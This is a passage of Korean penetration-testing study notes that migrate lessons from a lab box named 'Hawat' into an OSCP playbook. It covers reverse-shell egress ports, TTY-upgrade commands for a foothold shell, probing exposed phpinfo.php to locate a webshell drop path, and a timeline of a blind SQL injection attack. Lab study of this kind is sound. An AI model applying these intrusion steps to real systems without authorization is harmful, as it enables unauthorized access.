⚠️ [[Hawat]] 도 같은 오독 후보였음 — 원 노트가 **「아웃바운드가 443만 열려 있다 · 4444 로 리스너를 띄우면 영영 안 붙는다」**고 단정하고 그 근거로 nmap 의 `443/tcp closed` 를 들었음. **`443/tcp closed` 는 «인바운드» 스캔 결과라 아웃바운드 egress 정책의 근거가 아님.** 다른 포트를 시도한 기록이 `~/PG/Hawat/` 에 없어 「4444 는 안 붙는다」도 관측이 아님. **확인된 것은 성공 회선이 tcp/443 이라는 것뿐임**(2026-08-26 소급 감사에서 강등).
→ 일반화: **인바운드 스캔 결과로 egress 를 추론하지 말 것.** 둘은 서로 다른 방향의 정책임.
````

### 지우기 전 원문 (Hawat 노트 §3-5 콜아웃 · §7-2)

> > [!danger] 아웃바운드가 443만 열려 있다
> > 4444로 리스너를 띄우면 **영영 안 붙는다.** nmap 결과의 `443/tcp closed`(=필터링이 아니라 닫힘)가 힌트였다.
> > **리버스셸이 안 붙으면 포트를 의심하라.** 방화벽이 나가는 트래픽을 막는 경우 **443·80·53**이 뚫려 있을 확률이 높다.
> > 443 리스너는 1024 미만이라 **`sudo`가 필요**하다.
>
> `443/tcp closed`도 눈여겨볼 것 — **아웃바운드는 443만 허용**된다는 사실이 나중에 리버스셸에서 결정적이 된다.
>
> 2. **`443/tcp closed`를 리버스셸 힌트로 읽어라.** 아웃바운드가 443만 열린 경우 4444 리스너는 영영 안 붙는다. **안 붙으면 443·80·53을 시도**한다. 1024 미만은 `sudo` 필요.

(⚠️ 「443 리스너는 1024 미만이라 sudo 필요」는 사실이라 **박스 노트에 남겼음.** A-31 은 이미 「성공 회선은 443」으로 [[Hawat]] 을 정확히 인용하고 있으므로 이 병합은 그 근거를 보강하는 것임.)

---

## 제안 11 — `A-3. 셸` / **신규**

### 넣을 본문

````markdown
#### A-3-□. `python3` 가 없어 TTY 업그레이드가 안 된다

**Arch · Alpine · 최소 설치에서 흔함.** [[Hawat]](Arch Linux)에는 `python3` 도 `hostname` 도 없었음:
```text
bash: python3: command not found
```
**이 박스에서 통한 것** — `script -qc /bin/bash /dev/null`
**그 밖의 후보** — `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'`

→ **`python3 -c 'import pty; pty.spawn("/bin/bash")'` 를 반사적으로 치지 말고, 없으면 `script` 로 넘어갈 것.**

⚠️ **`hostname` 바이너리도 없을 수 있음** — 플래그 증거 한 화면(C-3)에서 `hostname` 이 죽으면 `uname -n` 또는 `cat /etc/hostname` 으로 대체할 것.
````

### 지우기 전 원문 (Hawat 노트 §3-5 콜아웃 · §5 콜아웃 · §7-10 · §9)

> > [!warning] `python3`가 없다 — TTY 업그레이드 실패
> > Arch 최소 설치라 `python3`도 `hostname`도 없다:
> > ```
> > bash: python3: command not found
> > ```
> > 대안:
> > ```bash
> > script -qc /bin/bash /dev/null          # ← 이 박스에서 통한 방법
> > perl -e 'exec "/bin/bash";'
> > /usr/bin/expect -c 'spawn /bin/bash; interact'
> > ```
> > **`python3 -c 'import pty...'`를 반사적으로 치지 말고, 없으면 `script`로 넘어가라.**
>
> > [!tip] 시험 증거 형식 연습
> > 실제 시험에서는 플래그를 이렇게 찍어야 인정된다:
> > ```bash
> > whoami; hostname; ip a; cat /root/proof.txt
> > ```
> > 이 박스는 `hostname` 바이너리가 없으니 `uname -n` 또는 `cat /etc/hostname`으로 대체한다.
>
> 10. **`python3`가 없을 때의 TTY 업그레이드**: `script -qc /bin/bash /dev/null`. Arch·Alpine·최소 설치에서 흔하다.
> - TTY 업그레이드 대안: `script -qc /bin/bash /dev/null`

(⚠️ 이 콜아웃은 **박스 노트 본문에도 축약해 남겼음** — Arch 라는 OS 판정과 직결되는 재현 정보라서.)

---

## 제안 12 — `A-1. 정찰·열거` / **신규**

### 넣을 본문

````markdown
#### A-1-□. Arch Linux 는 경로 관례가 다르다

**`/var/www/html` 이 아니라 `/srv/http`(nginx 기본).** [[Hawat]] 은 이 판정이 웹셸 투하 경로를 통째로 결정했음 — 데비안 관례로 찾았으면 못 찾음.

**OS 판정 근거를 둘 확보할 것**([[Hawat]] 실측):
1. `phpinfo.php` 의 `System` 필드 — `Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 x86_64`
2. nmap OS 추정 — `Aggressive OS guesses: Linux 5.0 - 5.14 (98%)` (커널 5.10 과 모순 없음)

**`phpinfo.php` 가 노출돼 있으면 한 번에 얻는 것** — `System`(OS·커널) · `DOCUMENT_ROOT` · `SCRIPT_FILENAME` · `disable_functions` · `open_basedir` · `Server API`(FPM 인지 mod_php 인지).
→ **PHP 박스를 만나면 `phpinfo.php`·`info.php`·`test.php` 를 먼저 찔러볼 것.** [[Hawat]] 은 gobuster 가 `/phpinfo.php`(200, 68610B)를 잡아 줬음(`~/PG/Hawat/gob_30455.txt`).
````

### 지우기 전 원문 (Hawat 노트 §1 콜아웃)

> > [!tip] **Arch Linux**라는 사실이 경로 관례를 바꾼다
> > 데비안/우분투의 `/var/www/html`이 아니라 **`/srv/http`(nginx 기본)** 를 쓴다.
> > `phpinfo.php`가 노출돼 있으면 `DOCUMENT_ROOT`·`SCRIPT_FILENAME`·`disable_functions`·`open_basedir`을 한 번에 얻는다. **PHP 박스를 만나면 `phpinfo.php`·`info.php`·`test.php`를 먼저 찔러본다.**

(⚠️ 이 콜아웃은 **박스 노트에도 남겼음** — 투하 경로 판정의 근거라 빠지면 재현이 끊김.)

---

## 제안 13 — `D. 시간 배분 · 손절 기준` / **기존 D 절에 병합(append)**

### 넣을 본문

````markdown
**[[Hawat]] — 소스 확보 우선이 통째로 이득이었던 사례.** 전체 작업 25분(`~/PG/Hawat/` mtime, 09:16:03 nmap → 09:25:42 마지막 산출물). 구간 분해:

| 구간 | 시각 | 소요 |
|---|---|---|
| 정찰(nmap 2회 + services) | 09:15:12 ~ 09:16:48 | 약 1분 36초 |
| 소스 회수·전개(Nextcloud WebDAV) | 09:16:59 ~ 09:17:14 | 약 15초 |
| 자가 가입 · 오라클 구축 | 09:18:24 ~ 09:18:41 | 약 17초 |
| 디렉터리 열거(50080·30455) | 09:19:38 ~ 09:20:30 | 약 52초 |
| **웹루트 헛짚기 → 탐색 → 파라미터화** | 09:20:35 ~ 09:23:20 | **약 2분 45초** |
| 마무리(재로그인 세션) | ~ 09:25:42 | — |

**최대 항목이 「어느 웹루트에 쓸 것인가」였음**(A-2-□). 소스 리뷰 자체는 15초에 끝났고 그 대가로 UNION 추출 시도가 **0회**였음 — 출력 채널 3개가 죽었다는 판정을 주입 전에 내렸기 때문(B-12).
→ **소스가 손에 들어오는 정황(zip · `.git` · 백업 · 공유 스토리지)이 보이면 다른 것보다 먼저 확보할 것.** 블랙박스로 blind SQLi 를 찾는 것보다 훨씬 쌈.
````

### 지우기 전 원문 (Hawat 노트 §6-④)

> ### ④ 시간 배분
>
> 소스 확보와 리뷰에 상당한 시간이 들었지만 **그 덕에 UNION으로 헤매지 않았다.**
> 시험 상황이라면 — **소스가 손에 들어오는 정황(zip·`.git`·백업)이 보이면 먼저 확보하는 것이 이득**이다. 블랙박스로 blind SQLi를 찾는 것보다 훨씬 빠르다.

⚠️ **원 노트의 「소스 확보와 리뷰에 상당한 시간이 들었다」는 mtime 과 어긋남.** 소스 회수·전개는 `issuetracker.zip`(09:17:14)과 `src/`(09:16:59) 사이 약 15초임. 실제 최대 항목은 웹루트 선택 구간(약 2분 45초)이었음. 위 표는 **재실측으로 정정한 것**임.

---

## 제안 14 — `E. OSCP 시험 규정` / **기존 E 절 확인만** — 신규 없음

Hawat 노트의 시험 금지 도구 서술은 `sqlmap` 하나뿐이고 이미 E 절에 있음. **이관 불요.**
박스 노트에는 「⚠️ 시험 금지 도구 — sqlmap」 콜아웃을 `Initial Access` 재현 절 서두에 남겼음(수동 절차가 바로 아래에 오므로 표준 요구 충족).

---

## 검산

- **박스 노트에서 삭제(이관) — 13건** (제안 1~13. 제안 14 는 이관 없음)
- **`_PLAYBOOK` append 제안 — 13건** (신규 7 · 기존 병합 6)
  - 신규: 제안 1(A-1) · 2(A-2) · 3(A-2) · 6(B-1) · 7(B-1 또는 B-2) · 11(A-3) · 12(A-1) — **7건**
  - 기존 병합: 제안 4(A-61) · 5(B-12) · 8(B-34) · 9(B-81) · 10(A-31) · 13(D) — **6건**
  - 합계 13건 ✅ 삭제 건수 = append 건수
- **박스 노트에 «남긴» 것**(이관과 «중복»으로 남긴 것 — 재현·납득에 필요해서): 페이로드 조각 해설 표 · `--data-urlencode` 이유 · hex 리터럴 콜아웃 · Arch 경로 콜아웃 · `python3` 부재 콜아웃(축약) · 「root RCE 의 원인은 MySQL 이 아니다」 콜아웃 · 웹루트 3행 표 · WebDAV curl 2줄
- **강등 2건** — ①`userId=0` 을 빼면 400 → `[가정]`(제안 6) ②「아웃바운드 443만 허용 / 4444 안 붙음」 → 성공 회선만 확정으로 강등(제안 10)
- **`_PLAYBOOK` 파일은 열지 않았음.** 기존 절 제목도 확인만 했고 변경 제안 없음
